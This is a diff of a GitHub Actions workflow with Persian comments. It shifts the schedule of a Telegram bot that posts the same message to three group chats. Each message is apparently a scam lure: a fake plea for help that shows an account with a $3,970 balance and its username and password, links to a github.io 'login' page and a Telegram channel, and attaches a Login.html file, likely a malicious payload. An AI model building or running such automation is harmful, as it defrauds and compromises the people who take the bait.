@@ -2,9 +2,9 @@ name: Send Message
 
 on:
   schedule:
-    - cron: '30 18 * * *'    # 10:00 PM
-    - cron: '30 21 * * *'    # 1:00 AM
-    - cron: '30 23 * * *'    # 3:00 AM
+    - cron: '35 18 * * *'    # 10:05 PM (با تاخیر ۵ دقیقه‌ای)
+    - cron: '35 21 * * *'    # 1:05 AM
+    - cron: '35 23 * * *'    # 3:05 AM
   workflow_dispatch:
 
 concurrency:
@@ -21,42 +21,33 @@ jobs:
         env:
           BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
         run: |
-          # Get current hour in UTC
           HOUR=$(date -u +%H)
           MINUTE=$(date -u +%M)
           
           echo "Current UTC time: $HOUR:$MINUTE"
           echo "Triggered by: ${{ github.event_name }}"
           
-          # ============================================
-          # GROUP 1 (10:00 PM = 18:30 UTC)
-          # ============================================
-          if [ "${{ github.event_name }}" == "workflow_dispatch" ] || ([ "$HOUR" == "18" ] && [ "$MINUTE" == "30" ]); then
-            echo "Sending to Group 1 (10:00 PM)"
+          # GROUP 1 (با بازه ۱۸:۳۵ تا ۱۸:۴۰)
+          if [ "${{ github.event_name }}" == "workflow_dispatch" ] || ([ "$HOUR" == "18" ] && [ "$MINUTE" -ge 35 ] && [ "$MINUTE" -lt 40 ]); then
+            echo "✅ Sending to Group 1"
             
-            # Send greeting
             curl -s -X POST https://api.telegram.org/bot${BOT_TOKEN}/sendMessage \
             -d chat_id=-1002507938213 \
             -d text="Hey everyone 👋"
             
             sleep 3
             
-            # Send file
             CAPTION=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
             
             curl -s -F document=@Login.html \
             -F chat_id=-1002507938213 \
             -F caption="$CAPTION" \
             https://api.telegram.org/bot${BOT_TOKEN}/sendDocument
-          else
-            echo "Skipping Group 1 - time not matched"
           fi
           
-          # ============================================
-          # GROUP 2 (1:00 AM = 21:30 UTC)
-          # ============================================
-          if [ "${{ github.event_name }}" == "workflow_dispatch" ] || ([ "$HOUR" == "21" ] && [ "$MINUTE" == "30" ]); then
-            echo "Sending to Group 2 (1:00 AM)"
+          # GROUP 2 (با بازه ۲۱:۳۵ تا ۲۱:۴۰)
+          if [ "${{ github.event_name }}" == "workflow_dispatch" ] || ([ "$HOUR" == "21" ] && [ "$MINUTE" -ge 35 ] && [ "$MINUTE" -lt 40 ]); then
+            echo "✅ Sending to Group 2"
             
             CAPTION=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
             
@@ -64,15 +55,11 @@ jobs:
             -F chat_id=-1002665528411 \
             -F caption="$CAPTION" \
             https://api.telegram.org/bot${BOT_TOKEN}/sendDocument
-          else
-            echo "Skipping Group 2 - time not matched"
           fi
           
-          # ============================================
-          # GROUP 3 (3:00 AM = 23:30 UTC)
-          # ============================================
-          if [ "${{ github.event_name }}" == "workflow_dispatch" ] || ([ "$HOUR" == "23" ] && [ "$MINUTE" == "30" ]); then
-            echo "Sending to Group 3 (3:00 AM)"
+          # GROUP 3 (با بازه ۲۳:۳۵ تا ۲۳:۴۰)
+          if [ "${{ github.event_name }}" == "workflow_dispatch" ] || ([ "$HOUR" == "23" ] && [ "$MINUTE" -ge 35 ] && [ "$MINUTE" -lt 40 ]); then
+            echo "✅ Sending to Group 3"
             
             CAPTION=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
             
@@ -80,6 +67,4 @@ jobs:
             -F chat_id=-1002680039813 \
             -F caption="$CAPTION" \
             https://api.telegram.org/bot${BOT_TOKEN}/sendDocument
-          else
-            echo "Skipping Group 3 - time not matched"
           fi
